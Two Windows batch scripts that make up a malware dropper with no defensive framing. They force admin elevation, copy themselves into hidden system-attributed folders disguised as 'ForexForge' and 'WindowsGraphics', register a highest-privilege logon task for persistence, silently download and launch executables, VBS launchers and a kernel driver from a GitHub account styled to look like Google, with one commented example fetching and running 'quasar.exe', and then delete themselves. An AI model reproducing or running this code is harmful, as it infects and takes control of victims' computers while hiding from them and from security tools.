@echo off
:: 1. ULTIMATE UAC BYPASS (Re-runs as Admin)
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
    exit /b
)

:: 2. SET UP STABLE PATHS
:: We use LocalAppData because it's harder for users to find and has fewer restrictions.
set "baseDir=%LocalAppData%\ForexForge"
set "hostExe=%baseDir%\EngineHost.bat"

:: 3. CLONE ITSELF (Final Boss Logic)
if not exist "%baseDir%" mkdir "%baseDir%" >nul 2>&1
copy /Y "%~f0" "%hostExe%" >nul

:: Hides the directory and the file (System+Hidden attribute)
attrib +s +h "%baseDir%" >nul
attrib +s +h "%hostExe%" >nul

:: 4. CREATE THE PERSISTENT TASK (No-UAC Reboot)
:: /RL HIGHEST: Runs as Admin but WITHOUT the UAC prompt at reboot.
:: /DELAY 0001:00: Waits 1 minute after login so the PC isn't laggy.
schtasks /create /tn "ForexForgeUpdates" /tr "'%hostExe%'" /sc onlogon /rl highest /delay 0001:00 /f >nul 2>&1

:: 5. YOUR MAIN DOWNLOAD CODE (Place your 7 files code here)
:: Example: curl -s -o "%temp%\quasar.exe" "https://link.com/q.exe" && start "" "%temp%\quasar.exe"

:: 6. THE "GHOST" EXIT (Self-Delete original)
if "%~dpf0" neq "%hostExe%" (
    start /b "" cmd /c del "%~f0"&exit
)


@echo off
setlocal

:: ============================================================
:: 1. UAC ELEVATION & AUTO-HIDE
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
    :: The '0' at the end of the next line tells Windows to run the window HIDDEN
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\admin.vbs"
    wscript "%temp%\admin.vbs"
    exit /b
)
if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"

:: ============================================================
:: 2. DIRECTORY SETUP (Now running hidden)
:: ============================================================
set "workDir=%AppData%\Local\WindowsGraphics\"
if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
cd /d "%workDir%"
if not exist "driver" mkdir "driver" >nul 2>&1

:: Security Protocol Fix
set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"

:: ============================================================
:: 3. DOWNLOADS
:: ============================================================
:: All 'echo' commands removed so no text is generated

powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'Config.toml')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"

:: ============================================================
:: 4. THE SILENT HANDOFF
:: ============================================================
if exist "launcher.vbs" (
    start "" "wscript.exe" "launcher.vbs"
)

:: Self-delete
(goto) 2>nul & del "%~f0"
exit


